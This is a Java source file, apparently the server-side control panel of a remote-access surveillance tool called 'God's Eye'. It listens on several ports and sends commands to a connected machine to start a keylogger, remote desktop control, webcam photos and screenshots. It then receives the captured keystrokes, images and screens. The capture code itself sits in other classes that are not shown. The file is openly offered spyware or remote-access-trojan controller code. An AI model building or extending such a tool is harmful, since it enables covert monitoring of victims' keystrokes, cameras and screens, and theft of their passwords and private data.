package Server;

import java.awt.Color;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

//Header files used by swing
import javax.swing.ButtonGroup;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JRadioButton;
import javax.swing.SwingConstants;

import Server.Keylogger.ReceiveLogs;
import Server.RemoteServer.*;
import Server.Screenshot.ReceiveScreenshot;
import Server.Webcam.ReceiveCam;

/*
 * class Name: MainFrame 
 * This class contains the implementation of GUI part of
 * the server side.
 */
public class MainFrame implements ActionListener {
	JFrame mainFrame;
	Font font;
	JRadioButton btnKeyOn, btnKeyOff, btnRemoteOn, btnRemoteOff;
	ButtonGroup bgKey, bgRemote;
	JLabel webcam, keylogger, remote, screenshot, label, labelu;
	JButton btnWebcam, btnScreenshot;

	ServerSocket remoteServer;
	ServerSocket webcamServer;
	ServerSocket screenshotServer;
	ServerSocket keyloggerServer;

	Socket screenshotSocket;
	Socket remoteSocket;
	Socket webcamSocket;
	Socket keyloggerSocket;

	Socket socket;

	DataOutputStream sendData;

	ServerRemoteSetup classRemoteServer;
	ReceiveCam classWebcam;
	ReceiveScreenshot classScreenshot;
	ReceiveLogs classKeylogger;
	

	/*
	 * Constructor to class MainFrame
	 * 
	 * Parameters: socket
	 * 
	 * ParameterType: socket -> Socket
	 * 
	 * Functionalities: Design the Main Frame body of the GUI window
	 */
	MainFrame(Socket socket) {

		// Handle Exception caused by ServerSocket and accept()
		try {

			// create connection for using Remote Desktop feature on port 9998
			remoteServer = new ServerSocket(9998);
			remoteSocket = remoteServer.accept();

			// create connection for using Webcam feature on port 9997
			webcamServer = new ServerSocket(9997);
			webcamSocket = webcamServer.accept();

			// create connection for using Screenshot feature on port 9996
			screenshotServer = new ServerSocket(9996);
			screenshotSocket = screenshotServer.accept();

			// create connection for using Keylogger feature on port 9995
			keyloggerServer = new ServerSocket(9995);
			keyloggerSocket = keyloggerServer.accept();

		} catch (IOException e) {
			e.printStackTrace();
		}

		this.socket = socket;

		// creating main frame
		mainFrame = new JFrame("God's Eye");
		mainFrame.setSize(500, 320);
		mainFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

		// set position to center
		mainFrame.setLocationRelativeTo(null);
		mainFrame.getContentPane().setLayout(null);

		// set background to white
		mainFrame.getContentPane().setBackground(Color.WHITE);

		// define font to be used in the GUI window
		font = new Font(Font.SANS_SERIF, Font.BOLD, 20);

		label = new JLabel("God's Eye");
		label.setFont(new Font(Font.MONOSPACED, Font.BOLD, 30));
		label.setBounds(155, 0, 200, 35);
		labelu = new JLabel("________________________");
		labelu.setBounds(155, 10, 200, 35);
		mainFrame.add(label);
		mainFrame.add(labelu);

		// set property of the Label Keylogger
		keylogger = new JLabel("Get Key Logs : ", SwingConstants.RIGHT);
		keylogger.setFont(font);
		keylogger.setBounds(40, 115, 200, 25);
		mainFrame.add(keylogger);

		// set property of the Label remote
		remote = new JLabel("Control Remotely : ", SwingConstants.RIGHT);
		remote.setFont(font);
		remote.setBounds(40, 55, 200, 25);
		mainFrame.add(remote);

		// set property of the Label Webcam
		webcam = new JLabel("Access Webcam : ", SwingConstants.RIGHT);
		webcam.setFont(font);
		webcam.setBounds(40, 175, 200, 25);
		mainFrame.add(webcam);

		// set property of the Label screenshot
		screenshot = new JLabel("Take Screenshot : ", SwingConstants.RIGHT);
		screenshot.setFont(font);
		screenshot.setBounds(40, 235, 200, 25);
		mainFrame.add(screenshot);

		// button for turning keylogger on
		btnKeyOn = new JRadioButton("On");
		btnKeyOn.setFont(font);
		btnKeyOn.setBounds(260, 108, 60, 25);
		btnKeyOn.setBackground(Color.WHITE);

		// button for turning keylogger off
		btnKeyOff = new JRadioButton("Off");
		btnKeyOff.setFont(font);
		btnKeyOff.setBounds(330, 108, 80, 25);
		btnKeyOff.setBackground(Color.WHITE);
		btnKeyOff.setSelected(true);
		btnKeyOff.setEnabled(false);

		bgKey = new ButtonGroup();
		bgKey.add(btnKeyOn);
		bgKey.add(btnKeyOff);
		mainFrame.add(btnKeyOn);
		mainFrame.add(btnKeyOff);

		// button for turning Remote Desktop On
		btnRemoteOn = new JRadioButton("On");
		btnRemoteOn.setFont(font);
		btnRemoteOn.setBounds(260, 57, 60, 25);
		btnRemoteOn.setBackground(Color.WHITE);

		// button for turning Remote Desktop off
		btnRemoteOff = new JRadioButton("Off");
		btnRemoteOff.setFont(font);
		btnRemoteOff.setBounds(330, 57, 80, 25);
		btnRemoteOff.setBackground(Color.WHITE);
		btnRemoteOff.setSelected(true);
		btnRemoteOff.setEnabled(false);

		// Adding radio buttons of Remote Desktop to one group
		bgRemote = new ButtonGroup();
		bgRemote.add(btnRemoteOn);
		bgRemote.add(btnRemoteOff);
		mainFrame.add(btnRemoteOn);
		mainFrame.add(btnRemoteOff);

		// Adding the Button to Take Photo
		btnWebcam = new JButton("Take Photo");
		btnWebcam.setFont(font);
		btnWebcam.setBounds(260, 175, 175, 25);
		mainFrame.add(btnWebcam);

		// Button fot getting Screenshot
		btnScreenshot = new JButton("Take Screenshot");
		btnScreenshot.setFont(font);
		btnScreenshot.setBounds(260, 235, 175, 25);
		mainFrame.add(btnScreenshot);

		// Adding the ActionListners to the Buttons to perform the Desired Actions
		btnRemoteOn.addActionListener(this);
		btnRemoteOff.addActionListener(this);
		btnKeyOn.addActionListener(this);
		btnKeyOff.addActionListener(this);
		btnScreenshot.addActionListener(this);
		btnWebcam.addActionListener(this);

		mainFrame.setVisible(true);
	}

	public void actionPerformed(ActionEvent ae) {
		try {
			sendData = new DataOutputStream(socket.getOutputStream());
			if (ae.getSource() == btnRemoteOn) {
				sendData.writeUTF("btnRemoteOn");
				btnRemoteOn.setEnabled(false);
				btnRemoteOff.setEnabled(true);
				classRemoteServer = new ServerRemoteSetup(remoteSocket);

			} else if (ae.getSource() == btnRemoteOff) {
				sendData.writeUTF("btnRemoteOff");
				btnRemoteOff.setEnabled(false);
				btnRemoteOn.setEnabled(true);
				classRemoteServer.close();

			} else if (ae.getSource() == btnKeyOn) {
				sendData.writeUTF("btnKeyOn");
				btnKeyOn.setEnabled(false);
				btnKeyOff.setEnabled(true);

			} else if (ae.getSource() == btnKeyOff) {
				sendData.writeUTF("btnKeyOff");
				btnKeyOff.setEnabled(false);
				btnKeyOn.setEnabled(true);
				classKeylogger = new ReceiveLogs(keyloggerSocket);
				classKeylogger.start();
				

			} else if (ae.getSource() == btnScreenshot) {
				sendData.writeUTF("btnScreenshot");
				classScreenshot = new ReceiveScreenshot(screenshotSocket);
				classScreenshot.start();

			} else if (ae.getSource() == btnWebcam) {
				sendData.writeUTF("btnWebcam");
				classWebcam = new ReceiveCam(webcamSocket);
				classWebcam.start();

			}
		} catch (IOException e) {

			e.printStackTrace();
		}
	}

}